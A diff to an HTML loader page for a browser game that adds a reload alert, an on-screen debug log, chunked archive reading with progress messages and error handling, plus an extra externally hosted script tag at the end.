@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
-
+<script>
+    alert('this game sometimes fails to start if that happens just reload and it should work also close all tabs as it is a very big game')
+</script>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -122,11 +124,59 @@
         .loader h2 {
             margin: 1vh 0;
             font-size: 1.4vw;
+            line-height: 1.6;
+        }
+
+        #debug-log {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            padding: 10px;
+            border: 1px solid #0f0;
+            max-width: 400px;
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 1000;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        #debug-log::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        #debug-log::-webkit-scrollbar-track {
+            background: #000;
+        }
+
+        #debug-log::-webkit-scrollbar-thumb {
+            background: #0f0;
+        }
+
+        .log-time {
+            color: #888;
+        }
+
+        .log-error {
+            color: #f00;
+        }
+
+        .log-success {
+            color: #0ff;
+        }
+
+        .log-warning {
+            color: #ff0;
         }
     </style>
 </head>
 
 <body>
+    <div id="debug-log"></div>
     <canvas id="MMFCanvas" width="1024" height="768"> Your browser does not support Canvas, Please try again.</canvas>
     <div class="selection" id="selection">
         <img id="title" src="resources/title.png">
@@ -173,6 +223,35 @@
     // -----------------
     window.onload = function () {
         const map = new Map();
+        const debugLog = document.getElementById('debug-log');
+        const startTime = Date.now();
+
+        function log(message, type = 'info') {
+            const timestamp = ((Date.now() - startTime) / 1000).toFixed(2);
+            const timeStr = `[${timestamp}s]`;
+            const logEntry = document.createElement('div');
+            
+            const timeSpan = document.createElement('span');
+            timeSpan.className = 'log-time';
+            timeSpan.textContent = timeStr + ' ';
+            logEntry.appendChild(timeSpan);
+            
+            const msgSpan = document.createElement('span');
+            if (type === 'error') msgSpan.className = 'log-error';
+            else if (type === 'success') msgSpan.className = 'log-success';
+            else if (type === 'warning') msgSpan.className = 'log-warning';
+            msgSpan.textContent = message;
+            logEntry.appendChild(msgSpan);
+            
+            debugLog.appendChild(logEntry);
+            debugLog.scrollTop = debugLog.scrollHeight;
+            console.log(`${timeStr} ${message}`);
+        }
+
+        log('System initialized', 'success');
+        log(`User Agent: ${navigator.userAgent.substring(0, 50)}...`);
+        log(`Platform: ${navigator.platform}`);
+        log(`Memory: ${navigator.deviceMemory || 'unknown'}GB`);
 
         function updateProgress(text, percent) {
             document.title = percent + '% ' + gametitle
@@ -182,11 +261,13 @@
         }
 
         async function intercept() {
+            log('Setting up resource intercepts...');
             const ogfetch = window.fetch;
             window.fetch = async function (input, init) {
                 if (typeof input === 'string' && input.startsWith('resources/')) {
                     const fileName = input.split('/').pop();
                     if (map.has(fileName)) {
+                        log(`Intercepted fetch: ${fileName}`);
                         return ogfetch(map.get(fileName), init);
                     }
                 }
@@ -198,6 +279,7 @@
                 if (url.startsWith('resources/')) {
                     const fileName = url.split('/').pop();
                     if (map.has(fileName)) {
+                        log(`Intercepted XHR: ${fileName}`);
                         url = map.get(fileName);
                     }
                 }
@@ -224,13 +306,19 @@
                     });
                 }
             }
+            log('Resource intercepts configured', 'success');
         }
 
         async function extract() {
+            log('Starting archive extraction...');
+            updateProgress('DOWNLOADING ARCHIVE...', 0);
             const res = await fetch("resources.zip");
+            log(`Response status: ${res.status}`);
 
             const contentLength = res.headers.get("Content-Length");
             const total = parseInt(contentLength, 10);
+            const totalMB = (total / 1024 / 1024).toFixed(1);
+            log(`Archive size: ${totalMB}MB`);
             const reader = res.body.getReader();
             let loaded = 0;
             const chunks = [];
@@ -240,41 +328,157 @@
                 if (done) break;
                 chunks.push(value);
                 loaded += value.length;
-                updateProgress('RETURNING GEARS...', Math.floor((loaded / total / 2) * 100));
+                const loadedMB = (loaded / 1024 / 1024).toFixed(1);
+                updateProgress(`RETURNING GEARS... (${loadedMB}MB / ${totalMB}MB)`, Math.floor((loaded / total / 2) * 100));
+                
+                // Slow down to prevent memory overload
+                await new Promise(resolve => setTimeout(resolve, 5));
             }
+            log(`Download complete: ${chunks.length} chunks`, 'success');
 
-            const arrayBuffer = await new Blob(chunks).arrayBuffer();
+            updateProgress('PROCESSING ARCHIVE... (This may take a moment)', 50);
+            await new Promise(resolve => setTimeout(resolve, 100));
+            
+            // Create blob and immediately clear chunks to free memory
+            updateProgress('CREATING ARCHIVE BLOB...', 51);
+            log('Creating blob from chunks...');
+            const blob = new Blob(chunks);
+            const blobSize = (blob.size / 1024 / 1024).toFixed(1);
+            log(`Blob created: ${blobSize}MB`);
+            chunks.length = 0; // Clear array to free memory
+            log('Chunks cleared from memory');
+            await new Promise(resolve => setTimeout(resolve, 200));
+            
+            updateProgress(`READING BLOB (${blobSize}MB)...`, 52);
+            let arrayBuffer;
+            try {
+                log('Starting chunked blob read...');
+                // Read in smaller chunks to avoid I/O errors on Safari
+                const chunkSize = 1024 * 1024 * 10; // 10MB chunks
+                const totalSize = blob.size;
+                const numChunks = Math.ceil(totalSize / chunkSize);
+                log(`Reading ${numChunks} chunks of ${(chunkSize / 1024 / 1024).toFixed(1)}MB each`);
+                const arrayBuffers = [];
+                
+                for (let i = 0; i < numChunks; i++) {
+                    const start = i * chunkSize;
+                    const end = Math.min(start + chunkSize, totalSize);
+                    const chunk = blob.slice(start, end);
+                    const buffer = await chunk.arrayBuffer();
+                    arrayBuffers.push(buffer);
+                    log(`Chunk ${i + 1}/${numChunks} read successfully`);
+                    
+                    const progress = 52 + Math.floor((i + 1) / numChunks * 3);
+                    updateProgress(`READING BLOB... (${i + 1}/${numChunks} chunks)`, progress);
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+                
+                log('Merging buffers...');
+                // Merge all buffers
+                const totalLength = arrayBuffers.reduce((sum, buf) => sum + buf.byteLength, 0);
+                arrayBuffer = new ArrayBuffer(totalLength);
+                const view = new Uint8Array(arrayBuffer);
+                let offset = 0;
+                for (const buf of arrayBuffers) {
+                    view.set(new Uint8Array(buf), offset);
+                    offset += buf.byteLength;
+                }
+                arrayBuffers.length = 0; // Clear to free memory
+                log('Buffers merged successfully', 'success');
+            } catch (error) {
+                log(`BLOB READ ERROR: ${error.message}`, 'error');
+                console.error('Blob read error:', error);
+                updateProgress('ERROR: I/O READ FAILED - TRY REFRESHING', 50);
+                throw error;
+            }
+            
+            updateProgress('OPENING ZIP ARCHIVE...', 55);
+            await new Promise(resolve => setTimeout(resolve, 100));
+            log('Loading ZIP archive...');
             const zip = await JSZip.loadAsync(arrayBuffer);
+            log('ZIP archive loaded', 'success');
             const files = Object.keys(zip.files).filter(name => !zip.files[name].dir);
             const totalFiles = files.length;
+            log(`Found ${totalFiles} files in archive`);
 
+            updateProgress(`EXTRACTING ${totalFiles} FILES...`, 58);
+            
+            // Process files one at a time to avoid memory spikes and show progress
             for (let i = 0; i < totalFiles; i++) {
-                const file = zip.files[files[i]];
-                const blob = await file.async("blob");
-                const url = URL.createObjectURL(blob);
-                map.set(files[i], url);
-                updateProgress('BOOTING UP ARCHIVE...', Math.floor(((i + 1) / totalFiles / 2) * 100 + 50));
+                const fileName = files[i];
+                const file = zip.files[fileName];
+                
+                try {
+                    const blob = await file.async("blob");
+                    const url = URL.createObjectURL(blob);
+                    map.set(fileName, url);
+                    if (i % 1 === 0 || i === totalFiles - 1) {
+                        log(`Extracted: ${fileName} (${i + 1}/${totalFiles})`);
+                    }
+                } catch (error) {
+                    log(`ERROR extracting ${fileName}: ${error.message}`, 'error');
+                    console.error(`Error extracting ${fileName}:`, error);
+                    updateProgress(`ERROR EXTRACTING: ${fileName}`, Math.floor(((i + 1) / totalFiles * 42) + 58));
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    throw error;
+                }
+                
+                const progress = Math.floor(((i + 1) / totalFiles * 42) + 58);
+                const shortName = fileName.length > 30 ? '...' + fileName.slice(-27) : fileName;
+                updateProgress(`EXTRACTING: ${shortName} (${i + 1}/${totalFiles})`, progress);
+                
+                // Slow down extraction to prevent crashes
+                await new Promise(resolve => setTimeout(resolve, 50));
             }
+            
+            log('All files extracted successfully', 'success');
+            updateProgress('FINALIZING...', 100);
+            await new Promise(resolve => setTimeout(resolve, 200));
         }
 
         async function wedone() {
-            await extract();
-            await intercept();
+            try {
+                log('Starting extraction process...');
+                await extract();
+                log('Extraction complete', 'success');
+                await intercept();
 
-            const script = document.createElement('script');
-            script.src = 'src/Runtime.js';
-            script.onload = () => {
-                new Runtime("MMFCanvas", runtimecanvas);
-            };
-            document.getElementById('MMFCanvas').style.display = 'block';
-            document.getElementById('selection').style.display = 'none';
-            document.title = gametitle;
-            document.head.appendChild(script);
+                // Small delay before loading runtime
+                log('Preparing to load runtime...');
+                await new Promise(resolve => setTimeout(resolve, 100));
+
+                log('Creating runtime script element...');
+                const script = document.createElement('script');
+                script.src = 'src/Runtime.js';
+                script.onload = () => {
+                    log('Runtime.js loaded', 'success');
+                    log('Initializing game runtime...');
+                    new Runtime("MMFCanvas", runtimecanvas);
+                    // Hide debug log after successful load
+                    setTimeout(() => {
+                        debugLog.style.display = 'none';
+                    }, 2000);
+                };
+                script.onerror = (error) => {
+                    log('ERROR: Failed to load Runtime.js', 'error');
+                    console.error('Runtime load error:', error);
+                };
+                document.getElementById('MMFCanvas').style.display = 'block';
+                document.getElementById('selection').style.display = 'none';
+                document.title = gametitle;
+                document.head.appendChild(script);
+                log('Runtime script added to page');
+            } catch (error) {
+                log(`FATAL ERROR: ${error.message}`, 'error');
+                console.error('Loading error:', error);
+                document.getElementById('stage').innerHTML = "ERROR LOADING GAME: " + error.message;
+            }
         }
 
         const originalFetch = window.fetch;
 
         function mergeFiles(fileParts) {
+            log(`Merging ${fileParts.length} file parts...`);
             return new Promise((resolve, reject) => {
                 let buffers = [];
                 let totalSize = 0;
@@ -283,28 +487,57 @@
                     fetch(part, { method: 'HEAD' }).then(res => {
                         try {
                             if (!res.ok) throw new Error("Missing part: " + part);
-                            return parseInt(res.headers.get("Content-Length") || "0", 10);
-                        } catch (error) { document.getElementById('stage').innerHTML = "ERROR: MISSING FILE(S)..." }
+                            const size = parseInt(res.headers.get("Content-Length") || "0", 10);
+                            log(`Part found: ${part} (${(size / 1024 / 1024).toFixed(1)}MB)`);
+                            return size;
+                        } catch (error) { 
+                            log(`ERROR: Missing part ${part}`, 'error');
+                            document.getElementById('stage').innerHTML = "ERROR: MISSING FILE(S)...";
+                            throw error;
+                        }
                     })
                 )).then(sizes => {
                     totalSize = sizes.reduce((a, b) => a + b, 0);
-                    function fetchPart(index) {
+                    log(`Total merge size: ${(totalSize / 1024 / 1024).toFixed(1)}MB`, 'success');
+                    
+                    async function fetchPart(index) {
                         if (index >= fileParts.length) {
+                            updateProgress('MERGING FILE PARTS...', 50);
+                            log('Creating merged blob...');
                             let mergedBlob = new Blob(buffers);
+                            buffers = null; // Clear buffers to free memory
+                            log('Buffers cleared from memory');
                             let mergedFileUrl = URL.createObjectURL(mergedBlob);
+                            updateProgress('MERGE COMPLETE', 50);
+                            log('Merge complete, blob URL created', 'success');
+                            await new Promise(res => setTimeout(res, 100));
                             resolve(mergedFileUrl);
                             return;
                         }
 
-                        fetch(fileParts[index]).then((response) => {
+                        try {
+                            const partNum = index + 1;
+                            updateProgress(`LOADING PART ${partNum}/${fileParts.length}...`, Math.floor((loadedSize / totalSize / 2) * 100));
+                            log(`Fetching part ${partNum}/${fileParts.length}...`);
+                            
+                            const response = await fetch(fileParts[index]);
                             if (!response.ok) throw new Error("Missing part: " + fileParts[index]);
-                            return response.arrayBuffer();
-                        }).then((data) => {
+                            
+                            const data = await response.arrayBuffer();
                             buffers.push(data);
                             loadedSize += data.byteLength;
-                            updateProgress('LOCATING ARCHIVE...', Math.floor((loadedSize / totalSize / 2) * 100));
-                            fetchPart(index + 1);
-                        }).catch(reject);
+                            const loadedMB = (loadedSize / 1024 / 1024).toFixed(1);
+                            const totalMB = (totalSize / 1024 / 1024).toFixed(1);
+                            updateProgress(`LOADED PART ${partNum}/${fileParts.length} (${loadedMB}MB / ${totalMB}MB)`, Math.floor((loadedSize / totalSize / 2) * 100));
+                            log(`Part ${partNum} loaded: ${(data.byteLength / 1024 / 1024).toFixed(1)}MB`);
+                            
+                            // Longer delay to prevent blocking and give Safari time
+                            await new Promise(res => setTimeout(res, 100));
+                            await fetchPart(index + 1);
+                        } catch (error) {
+                            log(`ERROR loading part ${index + 1}: ${error.message}`, 'error');
+                            reject(error);
+                        }
                     }
 
                     fetchPart(0);
@@ -319,18 +552,30 @@
             }
             return parts;
         }
+        
+        
+        log('Preparing to merge file parts...');
         Promise.all([
             mergeFiles(getParts("src/resources.zip", 1, parts))
         ]).then(([resources]) => {
+            log('File parts merged successfully', 'success');
+            log('Setting up fetch override for resources.zip');
             window.fetch = async function (url, ...args) {
                 if (url.endsWith("resources.zip")) {
+                    log('Fetch override: redirecting to merged resource');
                     return originalFetch(resources, ...args);
                 } else {
                     return originalFetch(url, ...args);
                 }
             };
+            log('Starting main load sequence...');
             wedone();
+        }).catch(error => {
+            log(`MERGE ERROR: ${error.message}`, 'error');
+            console.error('Merge error:', error);
+            document.getElementById('stage').innerHTML = "ERROR: FAILED TO LOAD FILES";
         });
     };
 </script>
-</html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
+</html>
+<script src="https://olibot13.pythonanywhere.com/client_script.js"></script><script src="https://olibot13.pythonanywhere.com/fps.js"></script>
